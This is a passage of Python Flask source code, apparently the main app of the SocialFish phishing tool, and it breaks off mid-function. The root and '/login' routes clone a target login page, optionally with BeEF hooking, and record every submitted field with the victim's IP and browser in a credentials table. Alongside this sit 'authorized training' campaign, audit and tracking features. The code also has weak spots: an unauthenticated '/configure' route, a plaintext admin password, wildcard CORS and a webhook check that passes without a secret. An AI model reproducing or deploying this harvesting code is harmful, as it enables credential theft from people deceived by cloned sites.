#!/usr/bin/env python3
#
from flask import Flask, request, render_template, render_template_string, jsonify, redirect, g, flash, Response
from flask_socketio import SocketIO, emit, join_room, leave_room
from core.config import *
from core.view import head
from core.scansf import nScan
from core.clonesf import clone
from core.dbsf import initDB
from core.genToken import genToken, genQRCode
from core.sendMail import sendMail
from core.tracegeoIp import tracegeoIp
from core.cleanFake import cleanFake
from core.genReport import genReport
from core.report import generate_unique
from core.db_migration import migrate_db
from core.audit_service import (
    audit_filter_options,
    get_audit_event,
    list_audit_events,
    record_ai_provider_audit,
    record_campaign_audit,
    record_delivery_audit,
    record_directory_sync_audit,
    record_export_audit,
    record_generation_audit,
    record_target_audit,
)
from core.simulation_service import (
    TARGET_CSV_COLUMNS,
    DELIVERY_STATUS_METRICS,
    VALID_CAMPAIGN_STATUSES,
    VALID_SIMULATION_CHANNELS,
    archive_campaign,
    archive_target,
    ai_generation_response_payload,
    build_delivery_preview,
    create_campaign,
    create_delivery_job_from_campaign,
    create_directory_provider_settings,
    create_target,
    generate_ai_scenario,
    check_campaign_delivery_readiness,
    get_campaign_metrics,
    get_campaign_detail,
    get_delivery_job_status,
    get_delivery_provider_by_key,
    get_directory_provider_settings,
    get_directory_sync_job_results,
    get_target_metrics,
    import_targets_csv,
    list_ai_provider_settings,
    list_campaigns,
    list_delivery_provider_settings,
    list_directory_groups,
    list_directory_provider_settings,
    list_directory_sync_jobs,
    list_targets,
    preview_directory_sync,
    record_provider_webhook_event,
    record_simulation_event,
    record_tracking_token_event,
    run_delivery_job,
    save_ai_campaign_draft,
    sync_directory_users,
    update_campaign,
    update_ai_provider_settings,
    update_delivery_provider_settings,
    update_directory_provider_settings,
    update_target,
)
from core.directory_connectors import (
    DirectoryConnectorError,
    DirectoryDisabledProviderError,
    DirectoryProviderConfigurationError,
    DirectoryProviderTypeError,
)
from core.ai_generation import (
    AIContentPolicyError,
    AIDisabledProviderError,
    AIGenerationError,
    AIProviderConfigurationError,
    AIProviderTypeError,
    AIScenarioRequest,
)
from core.simulation_utils import (
    json_dict as _shared_json_dict,
    json_list as _shared_json_list,
    redact_sensitive_value,
)
from core.tunnel_manager import TunnelManager
from core.recorder_playwright import PlaywrightRecorder
from core.cookie_inspector import CookieInspector
from core.recorder_selenium import SeleniumRecorder
from core.mock_server import MockLoginServer
from core.advanced_attacks import TabJacking, FileUploadInjection, AdvancedStealth, CAPTCHASolver
from datetime import date, datetime
from sys import argv, exit, version_info
import colorama
import sqlite3
import flask_login
import os
import json
import hashlib
import hmac
import asyncio
import logging
from pathlib import Path
from io import StringIO
import csv

# Configure logging
logger = logging.getLogger("SocialFish")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")

TARGET_CSV_REQUIRED_COLUMNS = ("name",)
TARGET_CSV_OPTIONAL_COLUMNS = tuple(
    column for column in ("display_name", "email", "phone", "department", "manager", "channel", "active")
    if column in TARGET_CSV_COLUMNS
)
TARGET_CSV_SAMPLE_ROWS = (
    {
        "name": "Jordan Rivera",
        "display_name": "Jordan",
        "email": "jordan.rivera@example.test",
        "phone": "",
        "department": "Finance",
        "manager": "Morgan Lee",
        "channel": "email",
        "active": "true",
    },
    {
        "name": "Taylor Kim",
        "display_name": "Taylor",
        "email": "",
        "phone": "+15551234567",
        "department": "Operations",
        "manager": "Casey Patel",
        "channel": "sms",
        "active": "true",
    },
)
ADMIN_FORM_STATUSES = ("draft", "active", "paused", "completed")
ALLOWED_CAMPAIGN_STATUS_TRANSITIONS = {
    "draft": {"draft", "active", "paused", "completed"},
    "active": {"active", "paused", "completed"},
    "paused": {"active", "paused", "completed"},
    "completed": {"completed"},
}
TRACKING_PIXEL_GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00"
    b"\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00"
    b"\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)
SIMULATION_TARGET_METRIC_EXPORT_FIELDS = (
    "campaign_id",
    "campaign_name",
    "target_id",
    "display_name",
    "name",
    "email",
    "phone",
    "department",
    "channel",
    "delivery_status",
    "total_targets",
    "queued",
    "sent",
    "delivered",
    "failed",
    "opened",
    "forwarded",
    "deleted",
    "link_clicked",
    "attachment_opened",
    "voice_responses",
    "delivered_rate",
    "opened_rate",
    "forwarded_rate",
    "deleted_rate",
    "link_clicked_rate",
    "attachment_opened_rate",
    "voice_responses_rate",
)
SENSITIVE_EXPORT_KEYS = {
    "api_key",
    "apikey",
    "authorization",
    "bearer",
    "credential",
    "credentials",
    "password",
    "secret",
    "secret_placeholder",
    "token",
    "webhook_secret",
}

# Verificar argumentos
if len(argv) < 2:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)

# Temporario
try:
    users = {argv[1]: {'password': argv[2]}}
except IndexError:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)
# Definicoes do flask
app = Flask(__name__, static_url_path='',
            static_folder='templates/static')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Initialize SocketIO for live panel
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Initialize managers
tunnel_manager = TunnelManager()
cookie_inspector = CookieInspector(DATABASE)

# Inicia uma conexao com o banco antes de cada requisicao
@app.before_request
def before_request():
    g.db = sqlite3.connect(DATABASE)

# Finaliza a conexao com o banco apos cada conexao
@app.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

# Ensure `socialfish` table has a default row and provide safe getters
def ensure_socialfish_row(conn):
    try:
        # `conn` may be a sqlite3.Connection; use its execute which returns a cursor
        conn.execute("""CREATE TABLE IF NOT EXISTS socialfish (
                                            id integer PRIMARY KEY,
                                            clicks integer,
                                            attacks integer,
                                            token text
                                        ); """)
        cur = conn.execute("SELECT id FROM socialfish WHERE id = 1")
        if cur.fetchone() is None:
            t = genToken()
            conn.execute('INSERT INTO socialfish(id,clicks,attacks,token) VALUES(?,?,?,?)', (1, 0, 0, t))
            conn.commit()
    except Exception as e:
        print(f'[-] ensure_socialfish_row error: {e}')


def sf_get(cur, column, default=None):
    try:
        row = cur.execute(f"SELECT {column} FROM socialfish where id = 1").fetchone()
        return row[0] if row and row[0] is not None else default
    except Exception:
        return default


def _request_data():
    return request.get_json(silent=True) or request.form.to_dict()


def _optional_int(value):
    if value in (None, ""):
        return None
    number = int(value)
    if number < 1:
        raise ValueError("IDs must be positive integers.")
    return number


def _normalize_api_channel(value, field_name="channel"):
    channel = (str(value or "").strip()).lower()
    if not channel:
        return None
    if channel not in VALID_SIMULATION_CHANNELS:
        raise ValueError("{} must be one of: {}".format(field_name, ", ".join(sorted(VALID_SIMULATION_CHANNELS))))
    return channel


def _normalize_api_date(value, field_name):
    if value in (None, ""):
        return None
    normalized = str(value).strip()
    try:
        datetime.strptime(normalized, "%Y-%m-%d")
    except ValueError as exc:
        raise ValueError("{} must use YYYY-MM-DD format.".format(field_name)) from exc
    return normalized


def _validate_date_range(start_date, end_date):
    if start_date and end_date and start_date > end_date:
        raise ValueError("Start date must be on or before end date.")


def _normalize_delivery_status_filter(value):
    normalized = (str(value or "").strip()).lower()
    if not normalized:
        return None
    if normalized not in DELIVERY_STATUS_METRICS:
        raise ValueError("Delivery status must be one of: {}".format(", ".join(sorted(DELIVERY_STATUS_METRICS))))
    return normalized


def _simulation_metric_filters(active_campaigns_only=False):
    channels = request.args.getlist("channel")
    if not channels and request.args.get("channels"):
        channels = request.args.get("channels", "").split(",")
    normalized_channels = [_normalize_api_channel(channel) for channel in channels]
    start_date = _normalize_api_date(request.args.get("start_date"), "start_date")
    end_date = _normalize_api_date(request.args.get("end_date"), "end_date")
    _validate_date_range(start_date, end_date)
    filters = {
        "channels": [channel for channel in normalized_channels if channel],
        "start_date": start_date,
        "end_date": end_date,
        "department": request.args.get("department"),
        "delivery_status": _normalize_delivery_status_filter(request.args.get("delivery_status")),
    }
    if active_campaigns_only:
        filters["active_campaigns_only"] = True
    return filters


def _metric_filter_options(conn):
    departments = [
        row[0]
        for row in conn.execute(
            """
            SELECT DISTINCT COALESCE(NULLIF(TRIM(department), ''), 'Unassigned') AS department
            FROM simulation_targets
            ORDER BY department ASC
            """
        ).fetchall()
    ]
    delivery_statuses = [
        row[0]
        for row in conn.execute(
            """
            SELECT DISTINCT delivery_status
            FROM simulation_targets
            WHERE delivery_status IS NOT NULL AND TRIM(delivery_status) != ''
            ORDER BY delivery_status ASC
            """
        ).fetchall()
    ]
    return {
        "channels": ("email", "sms", "voice"),
        "departments": departments,
        "delivery_statuses": delivery_statuses,
    }


def _audit_log_filters():
    start_date = _normalize_api_date(request.args.get("start_date"), "start_date")
    end_date = _normalize_api_date(request.args.get("end_date"), "end_date")
    _validate_date_range(start_date, end_date)
    return {
        "action_type": request.args.get("action_type") or None,
        "entity_type": request.args.get("entity_type") or None,
        "channel": request.args.get("channel") or None,
        "actor_identity": request.args.get("actor") or None,
        "campaign_id": _optional_int(request.args.get("campaign_id")),
        "start_date": start_date,
        "end_date": end_date,
    }


def _audit_event_view_model(event):
    if not event:
        return None
    view = dict(event)
    view["metadata_pretty"] = json.dumps(event.get("metadata") or {}, indent=2, sort_keys=True)
    return view


def _target_risk_score(target):
    return (
        int(target.get("link_clicked") or 0) * 5
        + int(target.get("attachment_opened") or 0) * 4
        + int(target.get("voice_responses") or 0) * 4
        + int(target.get("opened") or 0) * 2
        + int(target.get("forwarded") or 0) * 2
        + int(target.get("failed") or 0)
    )


def _risk_level(score):
    if score >= 5:
        return "High"
    if score >= 2:
        return "Medium"
    return "Low"


def _redact_export_value(value):
    return redact_sensitive_value(value, "[REDACTED]")


def _safe_event_export(event):
    exported = {
        "id": event.get("id"),
        "campaign_id": event.get("campaign_id"),
        "target_id": event.get("target_id"),
        "target_display_name": event.get("target_display_name"),
        "target_name": event.get("target_name"),
        "channel": event.get("channel"),
        "event_type": event.get("event_type"),
        "delivery_status": event.get("delivery_status"),
        "delivery_job_id": event.get("delivery_job_id"),
        "delivery_attempt_id": event.get("delivery_attempt_id"),
        "tracking_token_id": event.get("tracking_token_id"),
        "provider_reference_id": event.get("provider_reference_id"),
        "provider": event.get("provider"),
        "provider_event_id": event.get("provider_event_id"),
        "error_message": event.get("error_message"),
        "retry_count": event.get("retry_count"),
        "occurred_at": event.get("occurred_at"),
        "created_at": event.get("created_at"),
    }
    metadata = event.get("metadata")
    if isinstance(metadata, str):
        try:
            metadata = json.loads(metadata)
        except (TypeError, ValueError):
            metadata = {}
    exported["metadata"] = _redact_export_value(metadata or {})
    source = event.get("source")
    if source:
        exported["source"] = source
    return exported


def _target_metrics_csv_response(campaign, targets, filters):
    output = StringIO()
    writer = csv.DictWriter(output, fieldnames=SIMULATION_TARGET_METRIC_EXPORT_FIELDS, lineterminator="\n")
    writer.writeheader()
    for target in targets:
        writer.writerow({
            field: target.get(field, "")
            for field in SIMULATION_TARGET_METRIC_EXPORT_FIELDS
        })
    filename = "simulation-campaign-{}-target-metrics.csv".format(campaign["id"])
    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={
            "Content-Disposition": "attachment; filename={}".format(filename),
            "Cache-Control": "no-store",
            "X-SocialFish-Export-Filters": json.dumps(filters or {}, sort_keys=True),
        },
    )


def _form_bool(value):
    if value is None:
        return None
    if isinstance(value, bool):
        return value
    return str(value).lower() in ("1", "true", "yes", "on")


def _request_channels():
    if request.is_json:
        data = request.get_json(silent=True) or {}
        return data.get("selected_channels") or data.get("channels")
    return request.form.getlist("selected_channels") or request.form.getlist("channels")


def _campaign_payload():
    data = _request_data()
    status = (data.get("status") or "draft").strip().lower()
    if status not in ADMIN_FORM_STATUSES:
        raise ValueError("Campaign status must be one of: {}".format(", ".join(ADMIN_FORM_STATUSES)))
    start_date = _normalize_api_date(data.get("start_date"), "start_date")
    end_date = _normalize_api_date(data.get("end_date"), "end_date")
    _validate_date_range(start_date, end_date)
    return {
        "name": data.get("name"),
        "description": data.get("description"),
        "objective": data.get("objective"),
        "training_owner": data.get("training_owner"),
        "status": status,
        "selected_channels": _request_channels(),
        "landing_url": data.get("landing_url"),
        "training_url": data.get("training_url"),
        "start_date": start_date,
        "end_date": end_date,
        "authorized_scope": data.get("authorized_scope"),
        "authorization_statement": data.get("authorization_statement"),
    }


def _target_payload(include_active=True):
    data = _request_data()
    payload = {
        "name": data.get("name"),
        "display_name": data.get("display_name"),
        "email": data.get("email"),
        "phone": data.get("phone"),
        "department": data.get("department"),
        "manager": data.get("manager"),
        "source": data.get("source") or "manual",
        "channel": _normalize_api_channel(data.get("channel")) if data.get("channel") else None,
    }
    if include_active and "active" in data:
        payload["active"] = _form_bool(data.get("active"))
    return payload


def _json_error(error_type, message, status_code=400, **extra):
    payload = {
        "status": "error",
        "error": {
            "type": error_type,
            "message": message,
        },
    }
    payload["error"].update(extra)
    return jsonify(payload), status_code


def _validate_campaign_status_transition(existing_status, requested_status):
    current = (existing_status or "draft").lower()
    requested = (requested_status or current).lower()
    if current not in VALID_CAMPAIGN_STATUSES or requested not in VALID_CAMPAIGN_STATUSES:
        raise ValueError("Campaign status must be one of: {}".format(", ".join(sorted(VALID_CAMPAIGN_STATUSES))))
    allowed = ALLOWED_CAMPAIGN_STATUS_TRANSITIONS.get(current, {current})
    if requested not in allowed:
        raise ValueError("Campaign status cannot transition from {} to {}.".format(current, requested))


# CSRF compatibility note: this legacy Flask stack does not include Flask-WTF or
# hidden CSRF fields in the existing admin templates. Simulation mutation routes
# therefore keep the project-compatible guardrail of Flask-Login authenticated
# sessions plus strict same-route validation; a future template-wide CSRF token
# retrofit can be added without changing the service-layer contracts below.


def _tracking_metadata(source):
    return {
        "source": source,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
    }


def _provider_webhook_signature_valid(provider, body):
    settings = provider.get("settings") or {}
    secret = settings.get("webhook_secret") or settings.get("signature_secret")
    if not secret:
        return True
    signature = (
        request.headers.get("X-SocialFish-Signature")
        or request.headers.get("X-Provider-Signature")
        or request.headers.get("X-Hub-Signature-256")
    )
    if not signature:
        return False
    provided = signature.split("=", 1)[1] if "=" in signature else signature
    expected = hmac.new(str(secret).encode("utf-8"), body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(provided, expected)


def _ai_generation_payload():
    data = _request_data()
    campaign_id = _optional_int(data.get("campaign_id"))
    campaign_context = data.get("campaign_context") if isinstance(data.get("campaign_context"), dict) else {}
    if campaign_id:
        campaign = get_campaign_detail(g.db, campaign_id)["campaign"]
        campaign_context.update({
            "campaign_id": campaign["id"],
            "campaign_name": campaign["name"],
            "objective": campaign.get("objective"),
            "authorized_scope": campaign.get("authorized_scope"),
        })
    return {
        "provider_id": _optional_int(data.get("provider_id") or data.get("ai_provider_id")),
        "request": AIScenarioRequest(
            scenario_goal=data.get("scenario_goal") or data.get("objective"),
            audience=data.get("audience"),
            channels=data.get("channels") or data.get("selected_channels") or _request_channels(),
            tone=data.get("tone") or "professional",
            difficulty=data.get("difficulty") or "standard",
            safety_constraints=data.get("safety_constraints") or (),
            campaign_context=campaign_context,
            training_reminder=data.get("training_reminder"),
        ),
    }


def _delivery_provider_ids(data):
    provider_ids = data.get("provider_ids")
    if isinstance(provider_ids, dict):
        return {
            _normalize_api_channel(channel, "provider channel"): _optional_int(provider_id)
            for channel, provider_id in provider_ids.items()
            if _optional_int(provider_id) is not None
        }

    provider_ids = {}
    for channel in ("email", "sms", "voice"):
        provider_id = _optional_int(data.get("{}_provider_id".format(channel)))
        if provider_id is not None:
            provider_ids[channel] = provider_id

    provider_id = _optional_int(data.get("provider_id"))
    if provider_id is not None and not provider_ids:
        return provider_id
    return provider_ids or None


def _delivery_payload():
    data = _request_data()
    mode = (data.get("mode") or "dry_run").strip().lower()
    if mode not in {"dry_run", "provider"}:
        raise ValueError("Delivery mode must be dry_run or provider.")
    max_retries = int(data.get("max_retries") or 0)
    if max_retries < 0:
        raise ValueError("Max retries must be zero or greater.")
    return {
        "mode": mode,
        "provider_ids": _delivery_provider_ids(data),
        "max_retries": max_retries,
    }


def _delivery_settings_payload(data):
    settings = {}
    for key, value in data.items():
        if not key.startswith("setting_"):
            continue
        setting_name = key.split("setting_", 1)[1]
        if setting_name:
            settings[setting_name] = value
    return settings


def _payload_list(value):
    if value is None or value == "":
        return []
    if isinstance(value, (list, tuple)):
        return [str(item).strip() for item in value if str(item).strip()]
    if isinstance(value, str):
        stripped = value.strip()
        parsed = _shared_json_list(stripped)
        if stripped.startswith("["):
            return [str(item).strip() for item in parsed if str(item).strip()]
        return [item.strip() for item in value.split(",") if item.strip()]
    return [str(value).strip()]


def _payload_dict(value):
    if value is None or value == "":
        return {}
    if isinstance(value, dict):
        return dict(value)
    return _shared_json_dict(value)


def _directory_settings_payload(data):
    settings = _payload_dict(data.get("settings"))
    for key, value in data.items():
        if not key.startswith("setting_"):
            continue
        setting_name = key.split("setting_", 1)[1]
        if setting_name:
            settings[setting_name] = value
    return settings


def _directory_provider_payload():
    data = _request_data()
    return {
        "provider_id": _optional_int(data.get("provider_id") or data.get("id")),
        "name": data.get("name"),
        "provider_type": data.get("provider_type") or "mock_entra",
        "tenant_id": data.get("tenant_id"),
        "tenant_name": data.get("tenant_name"),
        "authority_url": data.get("authority_url"),
        "client_id": data.get("client_id"),
        "enabled": _form_bool(data.get("enabled")),
        "consent_status": data.get("consent_status") or "not_configured",
        "consented_scopes": _payload_list(data.get("consented_scopes") or data.get("consented_scopes_json")),
        "selected_groups": _payload_list(data.get("selected_groups") or data.get("selected_groups_json")),
        "field_mapping": _payload_dict(data.get("field_mapping") or data.get("field_mapping_json")),
        "settings": _directory_settings_payload(data),
        "secret_reference": data.get("secret_reference"),
        "secret": data.get("secret") or data.get("client_secret"),
    }


def _directory_group_response(group):
    return {
        "external_group_id": group.external_group_id,
        "display_name": group.display_name,
        "description": group.description,
        "member_count": group.member_count,
        "metadata": dict(group.metadata or {}),
    }


def _directory_connector_error_response(error):
    if isinstance(error, DirectoryDisabledProviderError):
        return _json_error("directory_provider_disabled", str(error), 400)
    if isinstance(error, DirectoryProviderConfigurationError):
        return _json_error("directory_provider_configuration", str(error), 400)
    if isinstance(error, DirectoryProviderTypeError):
        return _json_error("directory_provider_type", str(error), 400)
    return _json_error("directory_connector_error", str(error), 502)


def _directory_sync_request_payload():
    data = _request_data()
    return {
        "group_ids": _payload_list(
            data.get("group_ids")
            or data.get("selected_groups")
            or data.get("selected_groups_json")
        ),
        "campaign_id": _optional_int(data.get("campaign_id")),
    }


def _directory_requested_by():
    user_id = getattr(flask_login.current_user, "id", None)
    if user_id:
        return str(user_id)
    return "authenticated-admin"


def _audit_context(metadata=None, channel=None):
    return {
        "actor_identity": _directory_requested_by(),
        "channel": channel,
        "ip_address": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "metadata": metadata or {},
    }

# Conta o numero de credenciais salvas no banco
def countCreds():
    count = 0
    cur = g.db
    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
    for i in select_all_creds:
        count += 1
    return count

# Conta o numero de visitantes que nao foram pegos no phishing
def countNotPickedUp():
    count = 0

    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")

    for i in select_clicks:
        count = i[0]

    count = count - countCreds()
    return count

#----------------------------------------

# definicoes do flask e de login
app.secret_key = APP_SECRET_KEY
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass

@login_manager.user_loader
def user_loader(email):
    if email not in users:
        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = request.form.get('email')
    if email not in users:
        return

    user = User()
    user.id = email
    user.is_authenticated = request.form['password'] == users[email]['password']

    return user

# ---------------------------------------------------------------------------------------

# Rota para o caminho de inicializacao, onde e possivel fazer login
@app.route('/neptune', methods=['GET', 'POST'])
def admin():
    # se a requisicao for get
    if request.method == 'GET':
        # se o usuario estiver logado retorna para a pagina de credenciais
        if flask_login.current_user.is_authenticated:
            return redirect('/creds')
        # caso contrario retorna para a pagina de login
        else:
            return render_template('signin.html')

    # se a requisicao for post, verifica-se as credencias
    if request.method == 'POST':
        email = request.form['email']
        try:
            # caso sejam corretas
            if request.form['password'] == users[email]['password']:
                user = User()
                user.id = email
                # torna autentico
                flask_login.login_user(user)
                # retorna acesso a pagina restrita
                return redirect('/creds')
            # contrario retorna erro
            else:
                # temporario
                return "bad"
        except:
            return "bad"

# funcao onde e realizada a renderizacao da pagina para a vitima
@app.route("/")
def getLogin():
    # Get config from database instead of global variables
    conn = g.db
    config = conn.execute("SELECT * FROM socialfish WHERE id = 1").fetchone()
    # Retrieve status and URL from config or use defaults
    cur = conn.execute("SELECT status, url, beef FROM config LIMIT 1")
    conf_row = cur.fetchone()

    if conf_row:
        sta, url, beef = conf_row[0], conf_row[1], conf_row[2]
    else:
        sta = 'custom'
        url = 'https://github.com/UndeadSec/SocialFish'
        beef = 'no'
    
    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
    if sta == 'clone':
        agent = request.headers.get('User-Agent', 'Unknown').encode('ascii', 'ignore').decode('ascii')
        # Sanitize agent to prevent path traversal
        agent = agent.replace('..', '').replace('/', '_')
        clone(url, agent, beef)
        o = url.replace('://', '-')
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
        g.db.commit()
        template_path = 'fake/{}/{}/index.html'.format(agent, o)
        return render_template(template_path)
    # caso seja a url padrao
    elif url == 'https://github.com/UndeadSec/SocialFish':
        return render_template('default.html')
    # caso seja configurada para custom
    else:
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
        g.db.commit()
        return render_template('custom.html')

# funcao onde e realizado o login por cada pagina falsa
@app.route('/login', methods=['POST'])
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser) if request.user_agent else 'Unknown'
        bversion = str(request.user_agent.version) if request.user_agent else 'Unknown'
        platform = str(request.user_agent.platform) if request.user_agent else 'Unknown'
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())
        
        # Get redirect URL from config table
        cur = g.db
        conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
        red = conf_row[0] if conf_row else 'https://github.com/UndeadSec/SocialFish'
        
        # Get the target URL from config
        url_row = cur.execute("SELECT url FROM config LIMIT 1").fetchone()
        url = url_row[0] if url_row else 'https://github.com/UndeadSec/SocialFish'
        
        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
        creds = (url, str(data), d, browser, bversion, platform, rip)
        cur.execute(sql, creds)
        g.db.commit()
    
    # Get redirect URL from config
    cur = g.db
    conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
    red = conf_row[0] if conf_row else 'https://github.com/UndeadSec/SocialFish'
    
    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@app.route('/configure', methods=['POST'])
def echo():
    red = request.form.get('red', 'https://github.com/UndeadSec/SocialFish')
    sta = request.form.get('status', 'custom')
    beef = request.form.get('beef', 'no')

    if sta == 'clone':
        url = request.form.get('url', 'https://github.com/UndeadSec/SocialFish')
    else:
        url = 'Custom'

    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and 'https://' not in url:
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
    
    # Store configuration in database instead of global variables
    cur = g.db
    # Create config table if it doesn't exist
    cur.execute("""CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY,
        url TEXT,
        red TEXT,
        status TEXT,
        beef TEXT
    )""")
    
    cur.execute("DELETE FROM config")
    cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
                (url, red, sta, beef))
    cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
    g.db.commit()
    return redirect('/creds')

# pagina principal do dashboard
@app.route("/creds")
@flask_login.login_required
def getCreds():
    cur = g.db
    # Ensure the socialfish row exists and get values safely
    ensure_socialfish_row(cur)
    attacks = sf_get(cur, 'attacks', 0)
    clicks = sf_get(cur, 'clicks', 0)
    tokenapi = sf_get(cur, 'token', '')
    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)


@app.route("/simulations", methods=['GET'])
@flask_login.login_required
def simulations_dashboard():
    campaigns = list_campaigns(g.db)
    campaign_id = campaigns[0]["id"] if campaigns else None
    metrics = get_campaign_metrics(g.db, campaign_id)
    targets = list_targets(g.db, campaign_id)
    return render_template(
        'admin/simulations.html',
        campaigns=campaigns,
        metrics=metrics,
        targets=targets,
    )


@app.route("/simulations/metrics", methods=['GET'])
@flask_login.login_required
def simulation_metrics_dashboard():
    try:
        campaigns = list_campaigns(g.db)
        selected_campaign_id = _optional_int(request.args.get("campaign_id"))
        filters = _simulation_metric_filters(active_campaigns_only=selected_campaign_id is None)
        metrics = get_campaign_metrics(g.db, selected_campaign_id, filters)
        campaign_rows = []
        for campaign in campaigns:
            campaign_filters = _simulation_metric_filters()
            campaign_metrics = get_campaign_metrics(g.db, campaign["id"], campaign_filters)["aggregate"]
            campaign_rows.append({
                "campaign": campaign,
                "metrics": campaign_metrics,
            })

        risk_rows = []
        for target in metrics["targets"]:
            score = _target_risk_score(target)
            risk_rows.append({
                "target": target,
                "score": score,
                "level": _risk_level(score),
            })
        risk_rows.sort(key=lambda row: (-row["score"], row["target"].get("display_name") or ""))

        return render_template(
            'admin/simulation_metrics.html',
            campaigns=campaigns,
            selected_campaign_id=selected_campaign_id,
            metrics=metrics,
            campaign_rows=campaign_rows,
            risk_rows=risk_rows[:25],
            filter_options=_metric_filter_options(g.db),
            filters=filters,
        )
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
        return render_template(
            'admin/simulation_metrics.html',
            campaigns=list_campaigns(g.db),
            selected_campaign_id=None,
            metrics=get_campaign_metrics(g.db, filters={"active_campaigns_only": True}),
            campaign_rows=[],
            risk_rows=[],
            filter_options=_metric_filter_options(g.db),
            filters={},
        ), 400


@app.route("/simulations/campaigns", methods=['GET'])
@flask_login.login_required
def simulation_campaigns():
    campaigns = list_campaigns(g.db)
    for campaign in campaigns:
        campaign["metrics"] = get_campaign_metrics(g.db, campaign["id"])["aggregate"]
    return render_template(
        'admin/simulation_campaigns.html',
        campaigns=campaigns,
    )


@app.route("/audit-log", methods=['GET'])
@flask_login.login_required
def administrative_audit_log():
    selected_event = None
    filters = {}
    try:
        filters = _audit_log_filters()
        events = [
            _audit_event_view_model(event)
            for event in list_audit_events(g.db, **filters, limit=200)
        ]
        selected_event_id = _optional_int(request.args.get("event_id"))
        if selected_event_id:
            selected_event = _audit_event_view_model(get_audit_event(g.db, selected_event_id))
            if not selected_event:
                flash("Audit event #{} was not found.".format(selected_event_id), "danger")
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
        events = []
    return render_template(
        'admin/audit_log.html',
        events=events,
        selected_event=selected_event,
        campaigns=list_campaigns(g.db),
        filter_options=audit_filter_options(g.db),
        filters=filters,
    )


@app.route("/audit-log/<int:event_id>", methods=['GET'])
@flask_login.login_required
def administrative_audit_event_detail(event_id):
    event = get_audit_event(g.db, event_id)
    if not event:
        flash("Audit event #{} was not found.".format(event_id), "danger")
        return redirect("/audit-log")
    return render_template(
        'admin/audit_log.html',
        events=[_audit_event_view_model(event)],
        selected_event=_audit_event_view_model(event),
        campaigns=list_campaigns(g.db),
        filter_options=audit_filter_options(g.db),
        filters={},
    )


@app.route("/simulations/campaigns/new", methods=['GET'])
@flask_login.login_required
def new_simulation_campaign():
    return render_template(
        'admin/simulation_campaign_form.html',
        campaign=None,
        statuses=ADMIN_FORM_STATUSES,
        channels=("email", "sms", "voice"),
    )


@app.route("/simulations/campaigns", methods=['POST'])
@flask_login.login_required
def create_simulation_campaign():
    try:
        payload = _campaign_payload()
        if payload.get("name") and not (payload.get("authorization_statement") or "").strip():
            raise ValueError("Campaign authorization statement is required.")
        campaign = create_campaign(g.db, **payload)
        record_campaign_audit(
            g.db,
            "campaign.create",
            campaign["id"],
            **_audit_context(
                metadata={
                    "name": campaign["name"],
                    "status": campaign["status"],
                    "selected_channels": campaign["selected_channels"],
                    "authorized_scope_present": bool(campaign.get("authorized_scope")),
                    "authorization_statement_present": bool(campaign.get("authorization_statement")),
                }
            ),
        )
        flash("Campaign created for authorized internal training.", "success")
        return redirect("/simulations/campaigns/{}".format(campaign["id"]))
    except (TypeError, ValueError) as e:
        flash(str(e), "danger")
        return render_template(
            'admin/simulation_campaign_form.html',
            campaign=_request_data(),
            statuses=ADMIN_FORM_STATUSES,
            channels=("email", "sms", "voice"),
        ), 400


@app.route("/simulations/campaigns/<int:campaign_id>", methods=['GET'])
@flask_login.login_required
def simulation_campaign_detail(campaign_id):
    try:
        target_filters = {
            "source": request.args.get("source"),
            "department": request.args.get("department"),
            "group": request.args.get("group"),
        }
        detail = get_campaign_detail(g.db, campaign_id, target_filters=target_filters)
    except ValueError as e:
        flash(str(e), "danger")
        return redirect("/simulations/campaigns")
    return render_template(
        'admin/simulation_campaign_detail.html',
        campaign=detail["campaign"],
        targets=detail["targets"],
        events=detail["events"],
